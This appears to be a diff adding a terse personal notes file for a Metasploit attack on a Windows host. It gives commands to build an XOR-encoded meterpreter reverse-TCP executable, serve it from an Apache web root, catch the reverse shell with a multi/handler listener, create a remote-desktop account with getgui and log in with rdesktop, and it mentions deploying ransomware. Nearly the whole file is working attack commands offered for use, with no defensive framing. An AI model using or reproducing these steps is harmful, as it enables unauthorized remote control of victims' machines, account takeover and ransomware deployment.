@@ -1,0 +1,28 @@
+SHELL 1:
+
+sudo msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_tcp lhost=LOCALIP lport=4321 -e x64/xor -i 5 -f exe -o /var/www/html/sc.exe
+service apache2 start
+
+Catch the shell:
+
+SHELL 2:
+
+msfconsole
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost LOCALIP
+set lport 4321
+run
+
+Now go back to other text file
+
+When meterpreter shell is open:
+
+we should be on the client, try sysinfo
+
+run getgui -u weirdcredential -p password in meterpreter
+rdesktop -u weirdcredential -p password IP
+
+Should now be in an RDP session with the infected host.
+
+Can "deploy" ransomware, although getting it to execute is going to be a hassle for windows...
